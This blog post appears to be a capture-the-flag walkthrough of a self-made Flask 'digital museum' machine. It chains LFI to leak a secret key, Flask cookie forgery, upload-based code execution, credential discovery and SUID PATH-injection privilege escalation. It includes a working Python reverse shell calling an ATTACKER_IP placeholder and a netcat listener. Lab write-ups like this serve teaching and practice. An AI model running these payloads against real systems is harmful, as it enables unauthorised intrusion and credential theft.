---
title: "Masterpiece"
date: 2026-02-25
categories: [Personal]
tags: [Linux, Web, Cookies, Python, Privilege Escalation, BinEx]
published: true
---

This is vulnerable machine was a side project of mine that also served as great practice for Python, web exploitation, and Linux privilege escalation techniques as I went about studying those areas. Hopefully it will be accepted and y'all will get to hack it as well.

## Overview
When I first started the Masterpiece machine, the goal was to compromise a digital museum web application and ultimately retrieve both flags on the host. The application is a Flask-based gallery site hosting various artworks, and like many web challenges, the path to root begins with simple enumeration. The box combines several more-common attack techniques including web enumeration, Local File Inclusion, Flask session manipulation, remote code execution via file upload, and Linux privilege escalation.

## 1. Initial Enumeration
As usual, I started with an Nmap scan to see what services were running on the target machine.

```
nmap -sC -sV -oN scan.txt <target-ip>
```

The scan revealed two open services:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9
80/tcp open  http    nginx
```

SSH is open, but without credentials it isn’t immediately useful. The web server on port 80 is likely the intended entry point, so I navigated to the site in my browser.

The page loads a digital museum website with several navigation tabs such as Home, About, History, and Gallery. There are also options to register and log in, which is always a good place to start interacting with the application.

## 2. Creating a User Account
Since registration is available, I created a quick test account.

```
username: test
password: test123
```

After registering and logging in, I noticed the application set a Flask session cookie in the browser. This cookie stores information about the current session.

For now, nothing particularly sensitive appeared to be accessible with a normal user account, so I moved on to exploring the gallery.

## 3. Exploring the Gallery
The Gallery page contains several paintings with descriptions and images. Each artwork also provides a link to view additional metadata.

Clicking one of these metadata links results in a request like this:

```
http://target/gallery?page=monalisa.py
```

The application responds by displaying metadata about the artwork.

Trying a few variations revealed an interesting behavior. If I attempted to load a non-Python file, the application returned an error message:

Only archived metadata files are supported

This immediately suggested that the application was reading files directly from disk, which often leads to file inclusion vulnerabilities.

## 4. Testing for Local File Inclusion
If the application is including files from the filesystem, directory traversal might work.

I tried requesting a file outside the metadata directory.

```
http://target/gallery?page=../../app.py
```

This worked and returned the source code of the Flask application.

Reading the application source is extremely useful because it reveals how the server works internally. While scrolling through the code, I noticed this line:

```
from config import SECRET_KEY
```

Flask applications use a secret key to sign session cookies, so retrieving that file could allow me to forge my own cookies.

I attempted to read the configuration file using the same LFI technique.

```
http://target/gallery?page=../../config.py
```

The response contained:

```
SECRET_KEY = "[REDACTED]"
```

This is exactly what I needed.

## 5. Forging an Admin Cookie
Flask stores session data inside a signed cookie. Because I now had the secret key, I could generate my own cookie with elevated privileges.

To do this, I used a tool called `flask-unsign`.

First I installed it:

```
pipx install flask-unsign
```

Then I decoded the cookie from my browser to see its structure.

```
flask-unsign --decode --cookie '<session-cookie>'
```

The decoded session looked like this:

```
{'user': 'test', 'role': 'user'}
```

Since the application clearly relies on the role field for authorization, I changed it to admin and signed a new cookie.

```
flask-unsign \
--sign \
--cookie "{'user':'cbev','role':'admin'}" \
--secret "[REDACTED]"
```

The tool returned a new signed cookie value.

After replacing my browser cookie with the new one and refreshing the site, a new option appeared in the navigation menu:

Admin Dashboard

This confirmed that the cookie forgery worked.

## 6. Accessing the Upload Portal
Inside the admin dashboard, there is a section used by museum curators to upload restoration scripts.

These scripts are supposedly used to process artwork restoration tasks. However, looking back at the Flask source code we retrieved earlier, I noticed that uploaded Python files are executed with a command similar to:

```
python3 <uploaded_file>
```

That means if I upload a malicious Python script, the server will execute it.

This is a straightforward path to remote code execution.

## 7. Getting a Reverse Shell
To take advantage of this, I created a simple Python reverse shell.

```
import socket,os,pty

s=socket.socket()
s.connect(("ATTACKER_IP",9001))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/bash")
```

I saved this to a file named `shell.py`

Before uploading it, I started a listener on my attacking machine.

```
nc -lvnp 9001
```

Next, I uploaded the script through the admin portal and clicked the Send for Processing button.

After a short delay, the server executed the script and my listener received a connection.

```
www-data@masterpiece:/var/www/gallery$
```

I now had a shell on the machine as the web server user. It's a bit limited initially, so I upgraded and stabilized it for better interaction.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z
stty raw -echo;fg
ENTER
ENTER
```

With that done, I could begin enumerating the system.

## 8. Local Enumeration

The first thing I usually check is what other users exist on the system in order to pivot accounts.

```
cat /etc/passwd
```

One user that stood out was the archivist

Next, I searched the filesystem for interesting credential files.

```
find / -name "*cred*" 2>/dev/null
```

This revealed an unusual file:

```
/opt/.secret/.backup_cred
```

## 9. Pivoting to the Archivist User
Reading the file revealed credentials.

```
cat /opt/.secret/.backup_cred
```

I attempted to switch users.

```
su archivist
```

After entering the password, I successfully became the archivist user.

```
archivist@masterpiece:~$
```

## 10. User Flag
Once in the archivist home directory, the user flag is easy to find.

```
cat ~/user.txt
```

## 11. Searching for Privilege Escalation
Now the goal is to escalate to root.

A good first step is checking for SUID binaries.

```
find / -perm -4000 -type f 2>/dev/null
```

One entry stood out:

```
/usr/local/bin/frame_restore
```

Looking at its permissions:

```
-rwsr-xr-x root root frame_restore
```

This binary runs with root privileges.

## 12. Identifying the Vulnerability
Running the binary produced output related to artwork restoration tasks.

While analyzing its behavior, I noticed that it calls system utilities without specifying their full path.

This means it relies on the system PATH variable to locate the command.

If I place a malicious binary earlier in the PATH, the SUID program may execute my version instead.

## 13. Exploiting PATH Injection
First I created a fake executable that simply spawns a shell.

```
echo "/bin/bash" > restore_tool
```

Then I made it executable.

```
chmod +x restore_tool
```

Next I placed it in /tmp.

```
mv restore_tool /tmp/
```

Now I modified the PATH so that /tmp is searched first.

```
export PATH=/tmp:$PATH
```

Finally I ran the SUID program again.

```
/usr/local/bin/frame_restore
```

This time the program executed my malicious script instead of the intended command, resulting in a root shell.

```
root@masterpiece:/#
```

With root access, retrieving the final flag was straightforward.

```
cd /root
cat root.txt
```

## Conclusion
The Masterpiece machine serves as a great example of how multiple seemingly small weaknesses can chain together into full system compromise. The path to root involved us:
- Discovering a Local File Inclusion vulnerability
- Extracting a Flask secret key
- Forging an admin session cookie
- Achieving remote code execution via file upload
- Pivoting to another user through credential discovery
- Exploiting a SUID binary with PATH injection
- Each stage builds naturally on the previous one, making the challenge both educational and realistic.
